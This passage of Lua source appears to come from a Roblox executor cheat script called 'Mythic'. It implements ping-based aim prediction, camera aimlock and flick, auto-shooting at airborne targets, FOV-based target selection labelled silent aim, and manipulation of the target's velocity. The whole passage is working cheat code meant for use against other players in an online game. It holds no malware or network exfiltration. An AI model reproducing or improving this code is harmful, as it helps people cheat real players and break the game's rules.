                for i = 1, #predictionTable do
                    if ping < predictionTable[i][1] then
                        local pingBase = predictionTable[i][2]
                        local advancePredictionValue = calculateAdvancePrediction(Plr, workspace.CurrentCamera.CFrame.Position, pingBase)
                        getgenv().Mythic.HorizontalPrediction = advancePredictionValue
                        getgenv().Mythic.VerticalPrediction = advancePredictionValue
                        break
                    end
                end
            elseif getgenv().Mythic.AutoPredMode == "Blatant" then
                for i = 1, #Blatant do
                    if ping < Blatant[i][1] then
                        local value = Blatant[i][2]
                        getgenv().Mythic.HorizontalPrediction = value
                        getgenv().Mythic.VerticalPrediction = value
                        break
                    end
                end
            end
        end
    end
end


RunService.Heartbeat:Connect(function()
    if getgenv().Mythic.Flick and Plr and Plr.Character then
        local playerHumanoid = Plr.Character:FindFirstChild("Humanoid")
        if playerHumanoid and playerHumanoid.Health > 0 then
       
            local targetPart = Plr.Character:FindFirstChild("UpperTorso") or Plr.Character:FindFirstChild("Head")
            if targetPart and playerHumanoid.FloorMaterial == Enum.Material.Air then
                local camera = workspace.CurrentCamera
                local targetPosition = targetPart.Position + targetPart.Velocity * getgenv().Mythic.VerticalPrediction
                camera.CFrame = CFrame.new(camera.CFrame.Position, targetPosition)
            end
        end
    end
end)



RunService.Heartbeat:Connect(function()
    if getgenv().Mythic.Camera and Plr and Plr.Character and getgenv().Mythic.SelectedPart then
        local camera = Workspace.CurrentCamera
        local selectedPart = getgenv().Mythic.SelectedPart
        local targetPart = Plr.Character[selectedPart]

        if targetPart then
            local velocity
            if getgenv().Mythic.ResolverEnabled then
                if getgenv().Mythic.RESOLVER == "MoveDirection" then
                    velocity = Plr.Character.Humanoid.MoveDirection * Plr.Character.Humanoid.WalkSpeed
                elseif getgenv().Mythic.RESOLVER == "LookVector" then
                    velocity = targetPart.CFrame.LookVector * getgenv().Mythic.HorizontalPrediction * 1.0
                else
                    velocity = targetPart.Velocity
                end
            else
                velocity = targetPart.Velocity
            end

            local jumpOffset = getgenv().Mythic.jumpoffset or 0
            local fallOffset = getgenv().Mythic.FallOffset or 0

            local verticalVelocity = velocity.Y
            local appliedVerticalOffset = 0

            if verticalVelocity > 0 then
                appliedVerticalOffset = jumpOffset
            elseif verticalVelocity < 0 then
                appliedVerticalOffset = -fallOffset
            end

            local horizontalPrediction = getgenv().Mythic.HorizontalPrediction
            local verticalPrediction = getgenv().Mythic.VerticalPrediction

            local targetPosition = Vector3.new(
                targetPart.Position.X + (velocity.X * horizontalPrediction),
                targetPart.Position.Y + (velocity.Y * verticalPrediction) + appliedVerticalOffset,
                targetPart.Position.Z + (velocity.Z * horizontalPrediction)
            )

            local smoothness = getgenv().Mythic.smoothness or 0.1 
            camera.CFrame = camera.CFrame:Lerp(CFrame.new(camera.CFrame.Position, targetPosition), smoothness)
        end
    end
end)

local players = game:GetService("Players")
local client = players.LocalPlayer

local function AutoShoot()
    if Plr then
        local character = client.Character
        if character then
            local tool = character:FindFirstChildOfClass("Tool")
            if tool and tool:IsA("Tool") then
                tool:Activate()
            end
        else
            warn("Character not found for client")
        end
    else
        warn("No target (Plr) found")
    end
end

local Shot2ing = false

local function ApplyAntiGround()
    local character = Plr.Character
    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
    
    if humanoidRootPart then
        local velocity = humanoidRootPart.Velocity
        local SigmaAir = humanoidRootPart.Position.Y > 2

        if not SigmaAir and velocity.Y < -3 then
            if getgenv().Mythic.NoGroundShot then
                humanoidRootPart.Velocity = Vector3.new(velocity.X, 0, velocity.Z)
            end
        else
            if not getgenv().Mythic.NoGroundShot then
                humanoidRootPart.Velocity = Vector3.new(velocity.X, velocity.Y, velocity.Z)
            end
        end
    end
end

local targetSigm99928 = getgenv().Mythic.ShootDelay 
local targetSigmaPOBALLs = nil

local function checkTarget()
    if Plr and Plr.Character then
        local humanoid = Plr.Character:FindFirstChildOfClass("Humanoid")
        local humanoidRootPart = Plr.Character:FindFirstChild("HumanoidRootPart")
        
        if humanoid and humanoidRootPart then
            local SigmaAir = humanoid:GetState() == Enum.HumanoidStateType.Freefall or humanoidRootPart.Velocity.Y > 2
            
         
            if SigmaAir and getgenv().Mythic.AutoAir then
                if not targetSigmaPOBALLs then
                    
                    targetSigmaPOBALLs = tick()
                else
                   
                    local airDuration = tick() - targetSigmaPOBALLs
                    if airDuration >= targetSigm99928 then
                        if not Shot2ing then
                            Shot2ing = true
                            while Plr and Plr.Character and (SigmaAir) do
                                AutoShoot()
                                wait(0.001)
                               
                                SigmaAir = humanoid:GetState() == Enum.HumanoidStateType.Freefall or humanoidRootPart.Velocity.Y > 2
                                
                                
                                if not SigmaAir then
                                    Shot2ing = false
                                    targetSigmaPOBALLs = nil -- Reset the start time
                                    break
                                end
                            end
                            Shot2ing = false
                        end
                    end
                end
            else
                
                targetSigmaPOBALLs = nil
                Shot2ing = false
            end
        end
    end
end





game:GetService("RunService").RenderStepped:Connect(function()
    LookAtPlayer(Plr)
    checkTarget()
    if Plr then
        updatePredictionValue()
        ApplyAntiGround()
    end
end)


local Camera = workspace.CurrentCamera



getgenv().Filled = false
getgenv().FOVTransparency = 0.8
getgenv().FOVThickness = 1
getgenv().FOVColor = Color3.new(1, 1, 1)
getgenv().ShowFOV = false
getgenv().FOVSize = 25


local FOV = Drawing.new("Circle")
FOV.Transparency = getgenv().FOVTransparency
FOV.Thickness = getgenv().FOVThickness
FOV.Color = getgenv().FOVColor
FOV.Filled = getgenv().Filled
FOV.Radius = getgenv().FOVSize
FOV.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)

local function IsPlayerInFOV(player)
    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
        return false
    end

    local characterRootPart = player.Character.HumanoidRootPart
    local screenPosition, onScreen = Camera:WorldToViewportPoint(characterRootPart.Position)
    local centerScreenPosition = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    local distance = (centerScreenPosition - Vector2.new(screenPosition.X, screenPosition.Y)).Magnitude

    if onScreen and distance <= FOV.Radius then
        local ray = Ray.new(Camera.CFrame.Position, (characterRootPart.Position - Camera.CFrame.Position).unit * 500)
        local part, position = workspace:FindPartOnRay(ray, LocalPlayer.Character)
        return not part or part:IsDescendantOf(player.Character)
    end
    return false
end


RunService.RenderStepped:Connect(function()
    FOV.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    FOV.Radius = getgenv().FOVSize
    FOV.Visible = getgenv().ShowFOV
targetSigm99928 = getgenv().Mythic.ShootDelay

    if getgenv().Mythic.SilentAim then
        local MythicLocated = false

        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and IsPlayerInFOV(player) then
                MythicLocated = true
                Plr = player
                break
            end
        end

        if not MythicLocated then
            Plr = nil
        end
    end
end)
